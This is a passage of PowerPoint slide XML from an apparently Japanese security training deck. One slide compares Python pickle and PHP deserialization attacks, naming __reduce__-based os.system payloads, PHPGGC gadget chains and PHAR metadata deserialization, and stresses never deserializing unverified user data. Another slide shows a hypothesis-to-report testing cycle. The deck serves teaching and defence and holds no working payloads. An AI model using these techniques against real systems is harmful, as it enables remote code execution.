                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1100" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="1A1D21"/>
                          </a:solidFill>
                          <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                          <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                          <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
                        </a:rPr>
                        <a:t>__reduce__ 実装クラスで直接、任意callable+引数を実行</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1100" dirty="0">
                        <a:latin typeface="IBM Plex Sans" charset="0"/>
                        <a:ea typeface="IBM Plex Sans" charset="0"/>
                        <a:cs typeface="IBM Plex Sans" charset="0"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="48895" marR="48895" marT="48895" marB="4889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5891">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr indent="0" marL="0">
                        <a:lnSpc>
                          <a:spcPts val="1540"/>
                        </a:lnSpc>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1100" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="1A1D21"/>
                          </a:solidFill>
                          <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                          <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                          <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
                        </a:rPr>
                        <a:t>自動化ツール</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1100" dirty="0">
                        <a:latin typeface="IBM Plex Sans" charset="0"/>
                        <a:ea typeface="IBM Plex Sans" charset="0"/>
                        <a:cs typeface="IBM Plex Sans" charset="0"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="48895" marR="48895" marT="48895" marB="48895" anchor="t">
                    <a:lnL w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnL>
                    <a:lnR w="12700" cap="flat" cmpd="sng" algn="ctr">
                      <a:solidFill>
                        <a:srgbClr val="C5C4C1"/>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5C4C1"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                      <a:round/>
                      <a:headEnd type="none" w="med" len="med"/>
                      <a:tailEnd type="none" w="med" len="med"/>
                    </a:lnB>
                    <a:solidFill>
                      <a:srgbClr val="F7F6F2"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr indent="0" marL="0">
                        <a:lnSpc>
                          <a:spcPts val="1540"/>
                        </a:lnSpc>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1100" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="1A1D21"/>
                          </a:solidFill>
                          <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                          <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                          <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
                        </a:rPr>
                        <a:t>PHPGGC（フレームワーク別ガジェットチェーン集）</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1100" dirty="0">
                        <a:latin typeface="IBM Plex Sans" charset="0"/>
                        <a:ea typeface="IBM Plex Sans" charset="0"/>
                        <a:cs typeface="IBM Plex Sans" charset="0"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="48895" marR="48895" marT="48895" marB="48895"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5C4C1"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                      <a:round/>
                      <a:headEnd type="none" w="med" len="med"/>
                      <a:tailEnd type="none" w="med" len="med"/>
                    </a:lnB>
                    <a:solidFill>
                      <a:srgbClr val="F7F6F2"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr indent="0" marL="0">
                        <a:lnSpc>
                          <a:spcPts val="1540"/>
                        </a:lnSpc>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1100" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="1A1D21"/>
                          </a:solidFill>
                          <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                          <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                          <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
                        </a:rPr>
                        <a:t>汎用的にos.system等を呼ぶペイロードを自作しやすい</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1100" dirty="0">
                        <a:latin typeface="IBM Plex Sans" charset="0"/>
                        <a:ea typeface="IBM Plex Sans" charset="0"/>
                        <a:cs typeface="IBM Plex Sans" charset="0"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="48895" marR="48895" marT="48895" marB="48895"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5C4C1"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                      <a:round/>
                      <a:headEnd type="none" w="med" len="med"/>
                      <a:tailEnd type="none" w="med" len="med"/>
                    </a:lnB>
                    <a:solidFill>
                      <a:srgbClr val="F7F6F2"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="305891">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr indent="0" marL="0">
                        <a:lnSpc>
                          <a:spcPts val="1540"/>
                        </a:lnSpc>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1100" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="1A1D21"/>
                          </a:solidFill>
                          <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                          <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                          <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
                        </a:rPr>
                        <a:t>特殊な経路</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1100" dirty="0">
                        <a:latin typeface="IBM Plex Sans" charset="0"/>
                        <a:ea typeface="IBM Plex Sans" charset="0"/>
                        <a:cs typeface="IBM Plex Sans" charset="0"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="48895" marR="48895" marT="48895" marB="48895" anchor="t">
                    <a:lnL w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnL>
                    <a:lnR w="12700" cap="flat" cmpd="sng" algn="ctr">
                      <a:solidFill>
                        <a:srgbClr val="CBCBCB"/>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540"/>
                        </a:lnSpc>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1100" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="1A1D21"/>
                          </a:solidFill>
                          <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                          <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                          <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
                        </a:rPr>
                        <a:t>PHARのmetadata自動デシリアライズ（PHP&lt;8.0）</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1100" dirty="0">
                        <a:latin typeface="IBM Plex Sans" charset="0"/>
                        <a:ea typeface="IBM Plex Sans" charset="0"/>
                        <a:cs typeface="IBM Plex Sans" charset="0"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="48895" marR="48895" marT="48895" marB="4889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540"/>
                        </a:lnSpc>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1100" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="1A1D21"/>
                          </a:solidFill>
                          <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                          <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                          <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
                        </a:rPr>
                        <a:t>該当なし（ただしYAML.load, jsonpickle等類似ライブラリに注意）</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1100" dirty="0">
                        <a:latin typeface="IBM Plex Sans" charset="0"/>
                        <a:ea typeface="IBM Plex Sans" charset="0"/>
                        <a:cs typeface="IBM Plex Sans" charset="0"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="48895" marR="48895" marT="48895" marB="4889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7" name="Text 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="812800" y="3460948"/>
            <a:ext cx="10883392" cy="212030"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1470"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1050" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="6A7179"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>共通点：どちらも「ユーザー制御データを無検証でデシリアライズしない」が根本原則</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="10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14171A"/>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48866"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="3335"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2900" b="1" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="ECEAE4"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>仮説・検証・観測・評価・報告のサイクル</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2900" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="3" name="Image 0" descr="ellipse">    </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1"/>
          <a:srcRect l="0" r="0" t="0" b="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1936750" y="1541066"/>
            <a:ext cx="1143000" cy="1143000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Text 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2070100" y="1934766"/>
            <a:ext cx="1193800" cy="398661"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1470"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1050" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="E08A3C"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>仮説</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1470"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1050" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="B9C2C9"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Hypothesis</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="Image 1" descr="connector">    </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:srcRect l="0" r="0" t="0" b="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="3397250" y="2137966"/>
            <a:ext cx="254000" cy="76200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="6" name="Image 2" descr="ellipse">    </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:srcRect l="0" r="0" t="0" b="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="3651250" y="1541066"/>
            <a:ext cx="1143000" cy="1143000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3784600" y="1934766"/>
            <a:ext cx="1193800" cy="398661"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1470"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1050" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="3E6FBD"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>検証</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1470"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1050" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="B9C2C9"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Verification</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="8" name="Image 3" descr="connector">    </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId4"/>
          <a:srcRect l="0" r="0" t="0" b="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="5111750" y="2137966"/>
            <a:ext cx="254000" cy="76200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="9" name="Image 4" descr="ellipse">    </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId5"/>
          <a:srcRect l="0" r="0" t="0" b="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="5365750" y="1541066"/>
            <a:ext cx="1143000" cy="1143000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5499100" y="1934766"/>
            <a:ext cx="1193800" cy="398661"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1470"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1050" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="3E6FBD"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>観測</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1470"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1050" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="B9C2C9"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Observation</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="11" name="Image 5" descr="connector">    </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId6"/>
          <a:srcRect l="0" r="0" t="0" b="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="6826250" y="2137966"/>
            <a:ext cx="254000" cy="76200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="12" name="Image 6" descr="ellipse">    </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId7"/>
          <a:srcRect l="0" r="0" t="0" b="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="7080250" y="1541066"/>
            <a:ext cx="1143000" cy="1143000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Text 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7213600" y="1934766"/>
            <a:ext cx="1193800" cy="398661"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1470"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1050" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="ECEAE4"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>評価</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1470"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1050" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="B9C2C9"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Evaluation</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="14" name="Image 7" descr="connector">    </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId8"/>
          <a:srcRect l="0" r="0" t="0" b="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="8540750" y="2137966"/>
            <a:ext cx="254000" cy="76200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="15" name="Image 8" descr="ellipse">    </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId9"/>
          <a:srcRect l="0" r="0" t="0" b="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="8794750" y="1541066"/>
            <a:ext cx="1143000" cy="1143000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Text 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8928100" y="1934766"/>
            <a:ext cx="1193800" cy="398661"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1470"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1050" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="ECEAE4"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>報告</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1470"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1050" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="B9C2C9"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Report</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Shape 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2813348" y="3119041"/>
            <a:ext cx="6565205" cy="455910"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 16017"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1D2126"/>
          </a:solidFill>
          <a:ln w="6350">
            <a:solidFill>
              <a:srgbClr val="2B3036"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="18" name="Image 9" descr="Activity">    </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId10"/>
          <a:srcRect l="0" r="0" t="0" b="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="2994323" y="3258046"/>
            <a:ext cx="177800" cy="177800"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Text 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3273723" y="3249216"/>
            <a:ext cx="6101655" cy="220960"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1540"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1100" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="B9C2C9"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
